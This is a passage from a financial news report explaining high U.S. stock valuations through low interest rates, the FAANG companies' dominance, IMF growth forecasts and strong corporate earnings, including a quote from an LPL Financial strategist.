A world of zero interest rates benefits tech companies disproportionately because a low discount rate inflates future cash flows for companies where cutting edge innovation is likely to fuel faster growth. By any measure, the big five tech 'FAANG' stocks - Facebook (FB.O), Amazon (AMZN.O), Apple (AAPL.O), Netflix (NFLX.O) and Google (GOOGL.O) - dominate Wall Street. They have risen more than three times the broader S&P 500 in the last five years and their $7 trillion market cap is 21% of the whole index.

Another is good old-fashioned economic growth.

Some of the more bullish U.S. forecasts have been trimmed recently, but the International Monetary Fund expects 7.0% GDP growth in the United States this year, 4.6% in the euro zone, and just 2.8% in Japan.

On top of that, Corporate America is motoring along nicely.

LPL Financial's Detrick notes that some 85% of S&P 500 companies posted second quarter earnings beats. And 2021 consensus earnings per share estimates are for a 43% jump from last year.

""The Fed backstop helps explain why people are willing to pay higher multiples. But higher earnings are higher earnings, and that justifies a lot. Investors still see better opportunity in the U.S., and are willing to pay that premium,"" he said.
